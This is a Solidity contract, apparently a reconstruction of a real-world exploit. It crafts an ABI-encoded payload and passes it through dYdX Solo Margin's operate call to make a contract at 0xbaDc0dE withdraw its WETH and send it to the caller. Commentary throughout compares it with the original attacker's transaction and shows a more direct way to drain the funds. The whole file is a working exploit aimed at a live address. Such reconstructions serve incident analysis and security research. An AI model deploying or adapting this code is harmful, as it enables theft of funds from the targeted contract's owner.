pragma solidity ^0.8.0;

import "./ISoloMargin.sol";
import "./IERC20.sol";

contract Runner {
    ISoloMargin private constant soloMargin = ISoloMargin(0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e);
    IERC20 private constant weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address private constant badc0de = 0xbaDc0dEfAfCF6d4239BDF0b66da4D7Bd36fCF05A;

    struct Caller {
        uint256 a;
        address b;
        address c;
        address d;
        bool e;
    }

    struct Withdrawal {
        bool callWithdraw;
        address token;
    }

    struct Approval {
        address who;
        address token;
    }

    struct Params {
        uint256 a;
        uint256 b;
    }

    struct Callback {
        address target;
        bytes data;
        Params[] params;
    }

    struct Action {
        Withdrawal withdrawal;
        Approval approval;
        Callback callback;
    }

    /**
     * An attempt to build the raw ABI-encoded bytes sent as payload from scratch, making sense out of most relevant parameters used.
     */
    function _getAbiEncodedPayload() private view returns (bytes memory) {
        // Naming this `caller` for lack of better context on what the rest of the fields represent.
        // In any case, they don't seem to be needed for this scenario.
        Caller memory caller = Caller({
            a: 0,                   // unclear meaning. Set to `3` in exploiter's transaction, though apparently irrelevant. Perhaps `3` was just replayed from another tx.
            b: address(soloMargin), // Must match msg.sender according to badc0de's logic contract at 0xdd6bd08c29ff3ef8780bf6a10d8b620a93ac5705.
            c: address(0),          // unclear meaning.
            d: address(0),          // unclear meaning.
            e: false                // unclear meaning. Could also be a uint256 type.
        });

        // These seem to be parameters both sent to the callback and validated in logic at 0xdd6bd08c29ff3ef8780bf6a10d8b620a93ac5705.
        // So far, unclear what they represent.
        // In exploiter's transaction, this was set to [{4, 1}, {1, 2}]. Perhaps these values were just replayed from another tx.
        // It's also possible these are not the real types, even if I'm achieving a valid abi-encoded payload that can be successfully decoded.
        Params[] memory params = new Params[](2);
        params[0] = Params({ a: 0, b: 0 });
        params[1] = Params({ a: 1, b: 2 });

        Action[] memory actions = new Action[](1);
        actions[0] = Action({
            // In exploiter's transaction, this was set to { false, address(0) }
            // By setting this to { true, weth }, the exploiter could have taken the ETH directly.
            withdrawal: Withdrawal({ callWithdraw: true, token: address(weth) }),
            // In exploiter's transaction, this was { attackerContract, weth }
            // Which triggered the call to `weth.approve`. But that required a subsequent `weth.transferFrom`.
            // By setting the previous `withdrawal` field, this one can be left in zero values.
            approval: Approval({ who: address(0), token: address(0) }),           
            callback: Callback({
                // In exploiter's transaction, this target was set to their contract's address.
                // Perhaps it was due to a just-in-case replacement from the original tx they based their attack on.
                // Because for their "approve-then-transfer" attack vector, it wasn't needed.
                // Here it's needed because the withdrawn ETH is attached to the callback, sending it to the address set here.
                target: msg.sender,
                // In exploiter's transaction, this callback data also included the sig for `exchange(address,address,address,uint256,uint256)` (0x4798ce5b).
                // Perhaps that was just replayed from another tx. Beacuse the sig i) could be whatever and ii) it's not actually needed.
                // Still, as far as I understand from the code at 0xdd6bd08c29ff3ef8780bf6a10d8b620a93ac5705, data _must_ be attached. Because the contract attempts to abi.decode it.
                data: abi.encode(
                    // hex"4798ce5b",
                    params
                ),
                params: params
            })
        });

        return abi.encode(
            caller,
            actions,
            weth.balanceOf(badc0de)
        );
    }

    constructor() {
        // Boilerplate to interact with dYdX Solo Margin.
        // Most relevant part is the payload sent in the `data` field, and the target in `otherAddress`.
        ISoloMargin.AccountInfo[] memory dydxAccountInfo = new ISoloMargin.AccountInfo[](1);
        dydxAccountInfo[0] = ISoloMargin.AccountInfo({ owner: address(this), number: 1 });

        ISoloMargin.ActionArgs[] memory dydxActionArgs = new ISoloMargin.ActionArgs[](1);
        dydxActionArgs[0] = ISoloMargin.ActionArgs({
            actionType: ISoloMargin.ActionType.Call,
            accountId: 0,
            amount: ISoloMargin.AssetAmount({
                sign: false,
                denomination: ISoloMargin.AssetDenomination.Wei,
                ref: ISoloMargin.AssetReference.Delta,
                value: 0
            }),
            primaryMarketId: 0,
            secondaryMarketId: 0,
            otherAddress: badc0de,        // target of dYdX's `callFunction`
            otherAccountId: 0,
            data: _getAbiEncodedPayload() // payload to be attached in the `bytes` parameter of `callFunction`. To be consumed by 0xbadc0de.
        });

        soloMargin.operate(dydxAccountInfo, dydxActionArgs);
    }
}
